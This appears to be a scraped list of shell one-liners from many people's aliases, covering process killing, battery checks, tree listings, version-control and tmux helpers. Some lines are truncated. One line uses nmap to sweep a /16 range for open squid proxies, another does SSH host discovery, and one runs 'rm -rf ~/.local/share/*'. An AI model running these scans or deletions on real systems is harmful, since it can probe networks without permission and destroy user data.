xmodmap -pp | grep -e '\\s\+[13]\\s' | awk '{print \$2}' | sed 'N;s/\n/ /' | xargs -l bash -c 'xmodmap -e \
xinput| grep -i touchpad | awk '{print $7}' | cut -d = -f 2 | xargs xinput enable
xinput enable $(xinput -list | grep 'ELAN' | grep -v 'Pen' | cut -f 2 | sed -e 's/id=//')
xinput disable $(xinput -list | grep 'ELAN' | grep -v 'Pen' | cut -f 2 | sed -e 's/id=//')
xcrun simctl list|grep Booted|awk '{print $3}'|sed -e 's/(//g'|sed -e 's/)//g'
while true; do fortune | cowsay -f \`find \${COWPATH} -type f | sort -R | head -n1\` | lolcat -a -s 75; sleep 2; done
while true; do fortune -n 1 | cowsay -f \`find $COWPATH -type f | sort -R | head -n1\` | lolcat -a -s 100; sleep 2; done
while true ; do ps aux | grep ' [D] ' | awk '{print $2}' | xargs -n1 -I@ ls -al /proc/@/fd/ | grep /nas ; sleep .1 ; done
while sleep 1 ; do date >> ~/x.log ; startx >>~/x.log 2>&1 & wait || break ; sleep 10 || break ; done
weather | grep 'Temp\|Wind\|Wea' | cowsay -f turtle
weather kisp| grep '\-*[0-9\.][0-9\.]* C\|\-*[0-9\.][0-9\.]*%\|rain\|'
watch -n3 'sudo ps_mem | tail -n+2 | head -n-3 | tail -n10 | tac'
watch -n 1 'sensors | egrep -i package\|fan1 && nvidia-smi -a|egrep -i current\ temp\|fan'
vpn-disconnect & ps -ef | grep VPN-RELOAD | grep -v grep | cut -c 7-15 | xargs kill -9
vim `ls -t *.@(c|cpp|h|py)| head -1 `
vim `ls -rt | xargs file | grep -iv elf | tail -1 | cut -d: -f1`
vim -O $(swp | sed s/\.swp// | sed 's/^.\///' | sed 's/\/./\//' | xargs)
vboxmanage list runningvms | sed -r 's/.|\{(.*\}/|\1/' | xargs -L1 -I {} VBoxManage controlvm {} poweroff
valgrind ./`ls -rt | xargs file | grep -i elf | cut -d: -f1 | tail -1`
uuidgen | tr -d - | tr -d '\n' | tr '[:upper:]' '[:lower:]' | pbcopy && pbpaste && echo
upower -i /org/freedesktop/UPower/devices/battery_BAT0|grep 'percentage'|sed -e 's/ //g'|sed -e 's/percentage://'|sed -e 's/%//'
upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep -w 'energy\|percentage\|capacity\|empty'
upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep -E 'time to empty|state|to\ full|percentage'
upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep -E 'state|to\ full|to\ empty|percentage'
upower -i $(upower -e | grep 'BAT') | grep -E 'state|to\ full|percentage'
upower -d | grep percentage | tr -s [:space:] && upower -d | grep time | tr -s [:space:]
upower -d | grep -E --color=none 'state|percentage' | sed 's/ \+/ /g' | column -s: -t
unset $(env | grep AWS | grep -v AWS_REGION | grep -v AWS_DEFAULT_REGION | sed
umnt /mnt/Storage || umnt /mnt/Mutual || shutdown now
umnt /mnt/Storage || umnt /mnt/Mutual || reboot
tree -aCh -I 'node_modules|.meteor|.vscode|.git|semantic-ui'
tree -aC -I '.git|node_modules|vendor|var|.DS_Store' --dirsfirst
tree -I 'node_modules|bin|docs|lib|build'
tree -I 'env|.env|.git|*.pyc|__pycache__' -L 3
tree -I 'env|.env|.git|*.pyc|__pycache__' -L 2
tree -I 'CMakeCache.txt|CMakeFiles|Makefile|cmake_install.cmake|install_manifest.txt'
tree -I '.git|node_modules|bower_components|.DS_Store|build'
tree -I '*~|*.py[co]|__pycache__|.git|.venv'
tree -I '*.egg-info|*.pyc|__pycache__|__init__.py|node_modules'
tree -CAFa -I 'CVS|*.*.package|.svn|.git|node_modules' --dirsfirst
tput rmam; ps auxwwwx| head -1; ps auxwwwx | grep -v PID | sort -nr -k 3 | head -10; tput smam
tput rmam; ps auxwwwx | head -1 ; ps auxwwwx | grep -v PID | sort -nr -k 4 | head -10 ; tput smam
top -d 0.5 -b -n 2 | grep Cpu | tail -n 1 | cut -c 1-24 | awk '{print \$3}'
tmx2 attach -d || tmux attach -d || tm
tmux ls | sed 's/:/;/' | sed 's/\[.*\]//g' | column -t -s ';' | sed 's/(.*) //'
tmux list-windows | sed 's#(.*##' | fzf-tmux -d 15 | egrep -oh '[0-9]+' | xargs -d '\n' -L 1 tmux select-window -t
tmux list-buffers | head -n1 | sed 's/^\([^:]*\).*/\1/' | xargs tmux show-buffer -b | pbcopy
tmux attach-session || tmuxp load work || tmux
tmux attach-session -t \~ || tmux attach-session || tmux new-session -s \~
tmux -2 a || tmux -2 || /bin/bash
test -x /usr/bin/fs_cli && /usr/bin/fs_cli -x 'show channels' || /usr/local/freeswitch/bin/fs_cli -x 'show channels' | grep 'total.$' | cut -d' ' -f 1
td test | tee /dev/tty | awk '/out: Name/ { show=1 } show; /TOTAL/ { show=0 }' | sed 's/\[127.0.0.1:9041\] out: //' >| coverage.txt
tail -f log/development.log | grep -vE '(Served asset|Started GET ./assets|^$|RailsDevTweaks)'
tail -f /var/log/messages | grep -i 'iptables' --line-buffered | grep -Pi 'SRC\=([\d\.]+)' --color=always --line-buffered | grep -Pi 'dpt\=(\d+)' --color=always --line-buffered | grep -P '\s\d{2}\:\d{2}\:\d{2}\s' --color=always --line-buffered
t list | grep -v @cheet|grep -v @stall|grep -v @project|grep -v @band
systemctl list-units -t service --no-pager --no-legend | grep active | grep -v systemd | grep -v exited | awk '{ print \$1 }'
sysctl hw | egrep -i 'machine|model|ncpu|physmem'
sysctl dev.cpu.0.temperature | sed -e 's|.*: \([0-9.]*\)|\1|'
sysctl dev.cpu.0.freq | sed -e 's|.*: \([0-9.]*\)|\1|'
svn status |grep -v '\.swp$' |grep -v '~$' |grep -v '\._' |grep '^C'
svn status | grep \! | sed 's/^.* /svn rm /' | sed 's/\\\/\//g' | bash
svn status | grep -v '\.pyc' | grep -v '\.cel' | grep -v Doxyfile | grep -v kdevelop
svn status | grep '^\?' | sed -e 's/? *//' | sed -e 's/ /\\ /g' | xargs svn add
svn status | grep '?' | sed 's/^.* /svn add /' | sed 's/\\\/\//g' | bash
svn status --no-ignore | grep -E '(^\?)|(^\I)' | sed -e 's/^. *//' | sed -e 's/\(.*\)/\
svn st |grep ^? |grep -v node_modules|grep -v bower_components |awk '{print \$NF \
svn st | grep ! | cut -d! -f2| sed 's/^ *//' | sed 's/^/
svn st | egrep '[MA] *' | sed 's/[MA] *//' | grep -v Makefile | awk '{printf(\
svn log -v --xml | grep '<author.*/author>' | sort $* | uniq -c | sort -rn
svn log -q --stop-on-copy | grep '^r[0-9]' | sed 's/^r//;s/ |.*//' | tail -n 1
svn info | grep ^URL | sed 's/URL: //' | tr -d '\n' | pbcopy
sudo ~/source/reptyr/reptyr -s $(ps aux | grep classic_server | grep -v grep | grep -v sudo | awk '{print $2}')
sudo tcpflow -p -c -i eth0 port 80 | grep -oE '(GET|POST|HEAD) . .. HTTP/1.[01]|Host: .*'
sudo strace -p `ps x -L | grep mpd | tail -n 2 | head -n 1 | awk '{print $2}'`
sudo sh -c 'dumpkeys -k|grep -v Incr_Console|grep -v Decr_Console|grep -v Last_Console|loadkeys'
sudo ps xa | grep python | grep -v grep | cut -d' ' -f1 | xargs kill
sudo pc yum list installed |awk '/(x86_64|i686|noarch)/ {print \$1}'|wc -l
sudo pc dnf list installed |awk '/(x86_64|i686|noarch)/ {print \$1}'|wc -l
sudo npm list -g --depth=0. | grep -v npm | awk -F ' ' '{print $2}' | awk -F '@' '{print $1}' | sudo xargs npm remove -g
sudo npm cache clean -f && sudo npm install -g n || true && sudo n stable || true && sudo ln -sf /usr/local/n/versions/node/*/bin/node /usr/bin/node
sudo netstat -tulpn | grep 8000 | awk {'print \$7'} | grep -Eo '[0-9]+' | xargs kill
sudo netstat -nap | awk '(\$1 ~ /Proto/ && \$9 !~ /Path/) || (\$1 ~ /tcp|udp/ && \$4 ~ /0.0.0.0.*/) { print }'
sudo netstat -lantp | grep -i stab | awk -F/ '{print $2}' | sort | uniq
sudo lsusb -v | \grep -E --color=auto '\<(Bus|iProduct|bDeviceClass|bDeviceProtocol)' 2>/dev/null
sudo kill `ps aux|grep rewriter|grep root|grep httpd|cut -c10-14`
sudo kill -9 $(ps -ef | grep jboss | grep -v grep | grep -v /bin/sh | awk '{print $2}' )
sudo iwlist wlp3s0 scan | egrep 'Cell |Encryption|Quality|ESSID'
sudo iptables-save | grep '\-A INPUT' | awk {'print \$4'} | sed 's/\/32//g' | sq
sudo find /var/log/ -type f | xargs sudo ls -Slh | grep -E '.log$|.bz2$' | head
sudo fdisk -l | grep ^/dev/ | fzf | awk '{print $1}' | xargs -I {} echo mount {} FOLDER
sudo dtrace -l | perl -pe 's/^.*?\S+\s+(\S+?)([0-9]|\s).*/\1/' | sort | uniq
sudo docker rmi $(docker images -f dangling=true -q) || true && docker rmi $(docker image list -q) || true
sudo chmod 666 /dev/bus/usb/$(lsusb | grep Brother | sed s/Bus\ // | sed s:\ Device\ :/: | cut -d':' -f 1 ) && simple-scan
sudo arp-scan --localnet | grep '12:22:1e\|4a:f7:d2\|6e:a5:4d\|0a:af:65'
sudo apt-get remove $(dpkg -l|egrep '^ii linux-(im|he)'|awk '{print $2}'|grep -v `uname -r`)
sudo /sbin/ifconfig wlan0|grep inet|head -1|sed 's/\:/ /'|awk '{print $3}'
st;git diff|grep -n 'print\|!!\|bugbug\|TODO'
st | grep master.xml | sed 's/[^/]*.master.xml/.gen_lastrun/g' | sed 's/[\?!MRA] //g' | xargs touch
squeue -u $USER | tail -1 | tr -s ' ' | cut -s -d' ' -f2 | tr -d '[:alpha:]'
spotify status | /usr/bin/grep Track && spotify status | /usr/bin/grep Artist || echo 'No song is playing!'
source ~/.bashrc; kill $(ps aux | grep grep -v | grep -i MATLAB_maci64 | tr ' ' '\n' | grep [0-9] -m 1)
source source.bash || source ../source.bash || source ../../source.bash
source proxy proxy1.example.com 81 || source proxy 10.1.1.1 8080 || source proxy proxy3.example.com 81
source activate \`conda env list | head -n -2 | tail -n +3 | cut -f1 -d' ' | pick\`
sort|gsed -e '1d; s/^\.//;s/\/\([^/]*\)$/|--\1/;s/\/[^/|]*/| /g'
sort | uniq -c | sort -rn | head -40 | awk
shuf -i 1-50 -n 5 | sort -n | xargs && shuf -i 1-11 -n 2 | sort -n | xargs
showq | grep $USER | tail -n 1 | awk '{print $1}' | xargs qcat
setxkbmap gb dvorak 2> /dev/null || setxkbmap dvorak gb 2> /dev/null || setxkbmap dvorak'
sensors | egrep -i package\|fan1 && nvidia-smi -a|egrep -i current\ temp\|fan
sensors k10temp-pci-00c3 | grep --color -i temp1 | lolcat ; sensors amdgpu-pci-0100 | grep --color -i temp1 | lolcat
sed -e 's/[^0-9]//g' | tr '\n' '|' | sed -e 's/^/(/' -e 's/\|$/)/'
sed -e ""s_[0-9]*,[0-9]*[B|G|K|M|T]_\x1b[32m&\x1b[0m_"""
sed 's|sig\ 2*3*\ *P*N*||g' |
sed 's/type\s\(.*\?\)\s.*/\1/g' | sed 's/\s.*//' | sed 's/\(\(\w\+\/\)\?\(\w\+\)\/\)\?\w\+\.go:/\3./g' | sed 's/^\.//g' | xargs -L 1 go doc 2>/dev/null
sed 's/\$NAME/$NAME/g' $DATADIR/init.sh|sed 's#\$DATADIR#$DATADIR#g'|grep -v NOPRINT|sed 's/alias //g'|sed 's/=\
sed 's/\$NAME/$NAME/g' $DATADIR/dkr/init.sh|sed 's#\$DATADIR#$DATADIR#g'|grep -v NOPRINT|sed 's/alias //g'|sed 's/=\
security find-identity -v -p codesigning | head -1 | sed 's/1) //g' | sed 's/ //g' | sed 's/\
screen -ls | tail -n +2 | head -n -2 | awk '{print $1}' | xargs -I{} screen -S {} -X quit
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
screen -ls | cut -d. -f1 | awk '{print $1}' | awk '{print $1}'| xargs -I{} screen -S {} -X quit
screen -list | tail -n +2 | head -n -1 | tr -s ' ' '\t' | cut -f2
screen -list | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
s grc ps -aux|grep -v -E 'grep|vim|PATH='|grep
rs| grep -vE 'Started GET|Served asset|Could not determine' | sed '/^$/d'
rm -rf ~/.idm/*.spl | rm -rf ~/.idm/uex/* | rm -rf /tmp/*.spl | rm -rf ~/.local/share/* | /usr/local/bin/uex &
rg -o '\+\S+' ~/todo.txt-cli/someday.todo.txt | sort | uniq -c | sort -n | tac
rg -e '(//|#|<!--|;)\s*(TODO|FIXME)'
rg 'TODO|FIXME|HACK|OPTIMIZE|REVIEW'
rev | cut -d/ -f1 | rev | sort | uniq
repocmd git status | cleanStatus | grep : | cut -d: -f1 | uniq
read_funtemp_stdin || read_funtemp_read || :
qutebrowser -V | grep '^Git commit' | cut -d' ' -f3 && aur qutebrowser-git --noconfirm && qutebrowser -V | grep '^Git commit' | cut -d' ' -f3
qhost | grep compute | grep -v verari | sort | awk '{print \$1 \
pyenv global $(echo $(pyenv versions | cut -c 3- | sed -rn 's/^([[:digit:]][[:digit:].]+)($|( .*))/\1/p' | sort -r))
pwd; find . -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'
pwd | rev | cut -f1 -d '/' | rev | xargs tmux new-session -d -s && tmux attach
pushd ~/repos/treehouse && ./gradlew :projects:rolodex:clean && ./gradlew :projects:rolodex:shadowjar && pushd projects/rolodex && ./sideload.sh rolodex-test.aws.airbnb.com || popd || popd
pushd ~/repos/treehouse && ./gradlew :projects:rolodex-data-pipeline:omnes-offset-job:clean && ./gradlew :projects:rolodex-data-pipeline:omnes-offset-job:shadowjar && pushd projects/rolodex-data-pipeline/omnes-offset-job && ./scripts/sideload.sh gw2.spark.musta.ch || popd || popd
pushd ~/repos/treehouse && ./gradlew :projects:rolodex-data-pipeline:export-contacts-job:clean && ./gradlew :projects:rolodex-data-pipeline:export-contacts-job:shadowjar && pushd projects/rolodex-data-pipeline/export-contacts-job && ./scripts/sideload.sh gw2.spark.musta.ch || popd || popd
psu -p | grep ^python | awk -F'---' '{print \$1}' | sed 's/[^0-9]//g' | xargs -i kill {}
ps | grep zsh | cut -c 1-5 | sed '/'$$'/d' | xargs kill -9
ps | grep zeus && ps | grep zeus | awk '{print $1}' | xargs kill -3
ps | grep vim | egrep -v grep | awk '{print \$1}' | xargs kill -9
ps xa | ag postgres | ag -v ag | awk '{print $1}' | xargs kill
ps x | grep -i citrix | grep -v grep | awk '{ print $1 }' | xargs kill -9
ps x | grep 'cmsRun\|combine\|tmp_heppy.py' | grep -v grep
ps ww $(vncserver -list |tail -n +5 | sed -e s/^\\S\\+\\s\\+//) | tail -n +2 | sed -e s/^.*-rfbport\ // -e s/\\s.*$//
ps waux | grep vpn | awk '{ print $2 }' | head -n 3 | xargs sudo kill
ps ux | grep -v 'sshd\|tcsh' | awk '{print \$2;}' | xargs kill -9
ps faux | grep '\_ i3' | head -n 1 | awk '{print $2}' | xargs kill -s SIGCONT
ps ax|grep ssh|grep 9933|grep localhost|awk
ps ax|egrep '*\.exe'|grep -v 'egrep'|awk '{print $1 }' | xargs kill -9 $1 ; wineserver -k; wineserver -k9; pkill -9 .exe; pkill -9 Steam; pkill -9 steam; pkill -9 Epic; pkill -9 wine; pkill -9 wineserver; killall -9 wine wineserver; killall -9 .exe
ps axu|grep -e go/bin -e etcd |grep -v grep | awk '{print \\\$2}' | xargs kill
ps axu | grep npm | cut -d' ' -f3 | grep '$' | sudo xargs kill -9
ps axu | grep nodemon | cut -d' ' -f3 | grep '$' | sudo xargs kill -9
ps axu | grep node | cut -d' ' -f3 | grep '$' | sudo xargs kill -9
ps axu | grep gulp | cut -d' ' -f3 | grep '$' | sudo xargs kill -9
ps ax | grep skype | grep -v grep | awk '{print $1}' | xargs kill -9
ps ax | grep java |grep -v grep | awk '{print($1)}' | xargs kill -9
ps ax | grep /usr/progress/v1160/dlc/bin/_mprosrv | grep -v grep | awk '{print $1}' | xargs kill -9 2>/dev/null
ps ax | fzf | sed 's/^\s\+//' | cut -d ' ' -f 1 | xargs kill
ps ax | fzf --multi | sed 's/^\s\+//' | cut -d ' ' -f 1 | xargs sudo kill
ps avx|grep steemd|grep -v grep|grep -v zsh|grep -v docker
ps aux|head -1;ps aux|grep -v PID|sort -rn -k +4|head
ps aux|head -1;ps aux|grep -v PID|sort -rn -k +3|head
ps aux|grep sbt |grep -v grep| awk '{print \$2}' |xargs kill -9
ps aux| grep tomcat | grep -v grep |awk '{print $2}'|xargs sudo kill -9
ps aux| grep '/work/tomcat-portal-new' | grep -v grep | awk '{print $2}'|xargs sudo kill -9
ps auxww | grep -i 'google chrome' | grep -v grep | awk '{ print $2 }' | xargs kill -9
ps auxw | grep spring | grep -v grep | awk '{print \$2}' | xargs kill -9
ps auxw | grep lftp | tr -s ' ' | cut -d ' ' -f 2 | xargs kill
ps auxf| grep Xvnc | grep -v grep | grep -v thinlinc | awk '{print \$1 \
ps aux |tail -n+2 |sort -nrk4 |head -$(($(tput lines)-1)) |cut -c 1-$(tput cols)
ps aux |grep runserver |grep -v grep |awk '{print \$2}' |xargs kill
ps aux |grep 'node'| grep -v 'tern' | grep -v 'WebStorm' | grep -v 'grep'
ps aux | head -1; ps aux | tail -n +2 | sort -nr -k 4 | head -10
ps aux | head -1; ps aux | tail -n +2 | sort -nr -k 3 | head -10
ps aux | head -1 ; ps aux | grep -v PID | sort -rn -k +4 | head
ps aux | head -1 ; ps aux | grep -v PID | sort -rn -k +3 | head
ps aux | grep tony | grep -Ev '/(Library|System|Applications)'
ps aux | grep tensorboard | grep johnh | awk '{print \$2}' | xargs kill
ps aux | grep ssh | grep localhost | col 2 | xargs kill -9
ps aux | grep ssh | grep localhost | awk '{print $2}' | sudo xargs kill -9
ps aux | grep sewing | grep node_modules | awk '{print $2}' | xargs kill
ps aux | grep selenium-server-standalone | grep -v grep |awk {'print \$2'} |xargs kill -9
ps aux | grep rspec | grep -v grep | awk '{ print $2 }' | xargs kill -9
ps aux | grep redshift | grep -v grep | awk '{print \$2}' | xargs kill
ps aux | grep puma | sed -E 's/[[:space:]]+/ /g' | cut -d' ' -f 2 | xargs kill -9
ps aux | grep node | grep -v 'gulp' | awk '{print \$2}' | xargs kill -9
ps aux | grep java | grep -v grep | awk '{print \$2}' | xargs kill -9
ps aux | grep grunt | grep -v grep | awk '{print \$2}' | xargs kill -9
ps aux | grep girder | grep -v grep | awk '{print \$2}' | xargs kill -9
ps aux | grep emacs | grep daemon | awk '{print \$2}' | xargs kill && emacs --daemon
ps aux | grep USER | grep -v grep; ps aux|grep -i kilian |grep -v grep
ps aux | grep Sim | grep -v grep | awk '{print \$2}' | xargs -t kill -9 2>/dev/null
ps aux | grep -v root | sort | cut -f 1 -d ' ' | uniq -c
ps aux | grep -v grep | grep vimclojure | awk '{print \$2}' | xargs kill
ps aux | grep -v grep | grep runserver | awk '{ print $2 }' | xargs echo
ps aux | grep -v grep | grep puma | cut -d ' ' -f10 | xargs -n 1 kill
ps aux | grep 'java.*container' | grep -v 'grep' | awk '{print \$2}' | xargs kill -9
ps aux | grep $1| tr -s ' ' | cut -d' ' -f2| while read i ; do kill $i; done
ps aux | ack 'rake jobs:work' | awk '{print \$2}' | xargs kill -9; ps aux | ack 'rake jobs:work'
ps -x -ocommand | egrep '^ssh:.*\[mux\]' | cut -f 2 -d' ' | fzy | xargs -I\{\} -- ssh -S \{\} -O exit nop
ps -fu ecunnin | grep ' q ' |grep -v grep | awk '{print \$2}' | xargs kill -9
ps -f -u $USERNAME | grep ssh-agent | tr -s ' ' | cut -f3 -d' ' | xargs kill
ps -elf | grep $USER | grep -v sshd | grep -v $SHELL | grep -v grep
ps -el | head -n1 ; ps -el | tail -n+2 | sort -nrk6 | head -n5
ps -ef|grep ssh\ -D|grep -v grep| awk '{print \$2}' | xargs kill -3; sudo networksetup -setsocksfirewallproxy 'Wi-Fi' '' ''
ps -ef|grep rabbit|grep -v grep|awk '{print \$2}'|xargs kill -9
ps -ef|grep nosetests|grep -v grep|awk '{print \$2}'|xargs kill -9
ps -ef| grep java | grep -v grep |cut -b10-15 |xargs pwdx
ps -ef |grep develop@127.0.0.1 |grep beam | awk '{print $2}' | xargs kill
ps -ef |grep $CONF_DIR |grep $LIB_DIR |grep -v grep |awk '{print $2}'
ps -ef | pick | awk '{print \$2}' | xargs echo -n | pbcopy
ps -ef | grep worker.py | grep -v 'grep' | awk '{print $2};' | xargs kill
ps -ef | grep sidekiq | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep resque | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep postgres | grep -v grep| awk '{print \$2}'| xargs kill -9; rm -rf /tmp/.s.PGSQL.*;
ps -ef | grep pgadmin3 | grep -v grep | awk '{print \$2}' | xargs -n1 kill; exit
ps -ef | grep nginx | grep -v grep | cut -c 9-15 | xargs kill -9
ps -ef | grep mysql_5612 | grep -v grep | awk -F' ' '{print $2}' | xargs sudo kill -9
ps -ef | grep mysql_5540 | grep -v grep | awk -F' ' '{print $2}' | xargs sudo kill -9
ps -ef | grep mysql_5173 | grep -v grep | awk -F' ' '{print $2}' | xargs sudo kill -9
ps -ef | grep java | grep spring-boot-starter | grep -v grep | awk
ps -ef | grep java | grep -v grep | awk '{print \$2}' | xargs kill -9
ps -ef | grep java | grep -v grep | awk '{print \$2}' | xargs -r kill -9
ps -ef | grep gremlin | grep -v grep | awk '{print \$2}' | sudo xargs kill
ps -ef | grep geth | grep grep -v | awk '{print \$2}' | xargs -i kill -2 {}
ps -ef | grep fswatch | grep -v grep | awk '{print $2}' | xargs kill
ps -ef | grep firefox | grep kopp | grep -v auto | awk
ps -ef | grep dropbox | grep -v grep | awk '{print \$2}' | xargs renice 10 -p
ps -ef | grep celery | grep -v grep | awk {\$2} | xargs kill -9
ps -ef | grep Client.exe | grep -v grep | awk '{print \$2}' | xargs kill -9 && n 'Client Killed'
ps -ef | grep -i 'code|nvim' | grep -v XPCServices | grep -v egrep
ps -ef | grep 'ssh' | grep -v 'grep' | awk '{print $2}' | xargs kill -9
ps -ef | grep 'rails' | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | grep 'mysqld' | grep -v grep | awk '{ print $2 }' | xargs kill
ps -ef | grep 'avg' | grep -v grep | awk '{print $2}' | xargs kill -9
ps -ef | egrep '9222|9333|20058' | grep -v 'grep'
ps -eaf | grep $1; ps -eaf | grep $1 | grep -v grep | sed -e \
ps -e | grep JapaneseIM | grep -v grep | awk '{print \$1}' | xargs -I{} kill -9 {}
ps -ax | grep ruby | grep -v grep | awk '{print $1}' | xargs kill -9
ps -ax | grep discord | grep -v grep | awk '{print \$1}' | xargs kill -9
ps -ax | grep SimpleHTTPServer | head -n 1 | awk '{print \$1}' | xargs kill
ps -alumaespino | grep -v tcs| grep -v bash | grep -v ssh | grep -v grep
ps -aef | grep sass | grep scss | awk '{print \$2;}' | xargs -I {} kill {}
ps -Alf |grep -i webstorm |grep -v grep |awk -F' ' '{print \$4}' |xargs kill -9
ps -Af | grep java | grep -v ttys | awk '{print $2}' | xargs kill -9
ps -Ac | grep -i avid | colrm 1 2 | colrm 4 | xargs kill
ps $PS_HEADER | head -1; ps $PS_HEADER | tail -n +2 | egrep -v grep | egrep -i
ps $PSARGS | grep -v luke | grep -v root |grep -v UID| grep -v console
printf 'Ping: ' && ping google.com -c 1 | grep time= | cut -d'=' -f4 && speedtest | grep -E 'Download|Upload'
printenv | grep -P 'KRAKEN|K2|KUBE|HELM'
primewire $@ | grep -i openload | head -1 | xargs youtube-dl -g | xargs $PLAYER -fs
pip2 freeze | cut -d= -f1 | xargs sudo -H pip2 install --upgrade --no-cache-dir && pip3 freeze | cut -d= -f1 | xargs sudo -H pip3 install --upgrade --no-cache-dir
pip list --outdated --format=freeze | tee pipupdate_backup.txt | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip install -U
pip freeze --local | grep -v '^\-e' | grep -iv Django | cut -d = -f 1 | xargs -n1 pip install -U
pip freeze --local | cut -d = -f 1 | grep -v '^\(pyobjc\|bonjour\)' | sudo xargs pip install -U
ping -q -w 1 -c 1 `ip r | grep -m 1 default | cut -d ' ' -f 3` >/dev/null && echo 'Connected' || echo 'Not Connected'
ping -c3 $(netstat -rn | grep default | head -1 | grep -v ':' | awk '{print $2}')
ping -c 6 192.168.2.255 | awk '{ print }' | grep ':' | cut -f 1 -d ':' | arp -a
pid=$(ps -ef | grep '/usr/lib/postgresql/9.5/bin/postgres' | grep -E '^postgres' | sed 's/^postgres //g' | sed -E 's/([^[0-9]]*)([0-9]+)(.*)/\2/')
pgrep pulseaudio||pulseaudio &;pacmd list-sinks|egrep '\*|card:'
pgrep ps3joy.py > /dev/null || pgrep ps3joy_node > /dev/null || sudo /opt/ros/
perltidy -l=100 -ce -i=4 -b -ci=4 -vt=2 -cti=0 -pt=1 -bt=1 -sbt=1 -bbt=1 -nsfs -nolq -wbb='% + - err.txt generated.file succ.txt / x != == >= <= =~ !~ < > | & >= < = **= += *= &= <<= &&= -= /= |= >>= ||= .= %= ^= x=' -ole=unix $1
pep8 . | cut -d: -f 1 | sort | uniq | xargs autopep8 -i
pbpaste | sed $'s@|@\\\n|@g'|pbcopy ; pbpaste
pbpaste | arc paste | tail -1 | awk '{print $2}' | xargs open
parse_git_branch | sed -e 's/(//g' | sed -e 's/)//g' | tr -d '\n' | pbcopy
pacman -Qdt | egrep -o '[a-z0-9-]+ '\ | sudo pacman -Rs || echo 'no unused orphan packages to remove'
p4o | grep +x | cut -d / -f 7- | cut -d '#' -f 1 | xargs p4 reopen -t text
opscore jira list --mine | grep -v '\---' | sed 's/\x1b\[[0-9;]*m//g' | egrep -v '(^$|^#)'
openssl rand 12 | base64 | tr '-d' '\n' | tr '-d' '/' | pbcopy
open `git remote -v | awk '/fetch/{print $2}' | sed -Ee 's#(git@|git://)#http://#' -e 's@com:@com/@'`| head -n1
open \`gitonfig -l | grep 'remote.origin.url' | sed -En 's/remote.origin.url=git(@|:\/\/)github.com(:|\/)(.+)\/(.+).git/https:\/\/github.com\/\3\/\4/p'\`
open \`git config -l | grep --color=never 'remote.origin.url' | sed -En 's/remote.origin.url=git(@|:\/\/)github.com(:|\/)(.+)\/(.+).git/https:\/\/github.com\/\3\/\4/p'\`
open \`git config -l | grep 'remote.origin.url' | sed -En \ 's/remote.origin.url=git(@|:\/\/)github.com(:|\/)(.+)\/(.+).git/https:\/\/github.com\/\3\/\4/p'\`
open \`git config -l | grep 'remote.origin.url' | sed -En 's/remote.origin.url=git(@|:\/\/)github.com(:|\/)(.+)\/(.+).git/https:\/\/github.com\/\3\/\4/p'\`
open \$(git remote -v | grep push | cut -f2 | cut -d ' ' -f1 | sed -e 's/:[0-9][0-9]*//' -e 's/ssh:\/\/git@/http:\/\//' -e 's/\.git//' -e 's/:[^/]/\//')
open -a Xcode *.xcworkspace 2>/dev/null || open -a Xcode *.xcodeproj 2>/dev/null || echo \
open $(git remote -v | head -n 1 | awk '{ print $2 }'| awk -F'[:]' '{ print $2 }'| awk -F'.git' '{ print
open $(git remote -v | head -n 1 | awk '{ print $2 }' | awk -F'[:]' '{ print $2 }' | awk -F'.git' '{ print
nsrzsh || nsrzsh nix/shell.nix || nsrzsh tools/shell.nix
npm run development || npm run develop || npm run dev
npm run build || npm run dist || npm run production
npm outdated | tee ./pack_outdated.log; salita | tee -a ./pack_outdated.log; npm test | tee ./test.log; npm-check | tee ./npm_check.log
npm outdated | tee ./pack_outdated.log; salita --update | tee -a ./pack_outdated.log; npm test | ./test.log; npm-check -u | tee ./npm_check.log
npm outdated --json --depth=0 | jq --ascii-output --monochrome-output '. | keys | .[]' | xargs npm install $1 --save-dev
npm ls -gp --depth=0 | awk -F/node_modules/ '{print $2}' | grep -vE '^(npm|)$' | xargs npm -g rm
npm ls --parseable|sed 's/.*\/\(.*\)/\1/g'|sort|uniq|wc -l
nmap -p 22 '192.168.1.*' 2>/dev/null|grep -b3 'open ssh'|grep 'report for'|sed 's/.*Nmap scan report for //'|sort --uniq
nmap -n -p3128 10.8.0.0/16 --open --oG - -T4 | grep squid | grep -Po 'Host: \K\d.*?(?= )' | xargs -n 1 -I host bash -c 'if curl --proxy1.0 host:3128 --silent --head http://www.google.com/ | grep \
nl | shuf | head | sort -n | cut -f2-
netstat -nr | grep -m 1 -iE 'default|0.0.0.0' | awk '{print \$2}' | sed 's/\.[0-9]*$//'
netstat -lantp | grep ESTABLISHED |awk '{print \$5}' | awk -F: '{print \$1}' | sort -u
netstat -lantp | grep -i stab | awk -F/ '{print $2}' | sort | uniq
netstat -ant | awk '{print $NF}' | grep -v '[a-z]' | sort | uniq -c
mvn versions:display-dependency-updates versions:display-plugin-updates | grep 'INFO' | grep '>' | sort | uniq
mr sys:cr:li | grep '*' | awk '{print \$2}' | fzf | xargs magerun2 sys:cr:run
mount | grep --color=never '^/'| sed -r 's/ (type|on) / /g' | column -t
mount | \grep -wq freeboxanna || curlftpfs 'freebox@78.201.68.5/Disque dur' /freeboxanna/ ; mount | \grep -w freeboxanna
mount | \grep -wq freebox-server || curlftpfs 'freebox@freebox-server.local/Disque dur' /mnt/freebox/ ; mount | \grep -w freebox-server
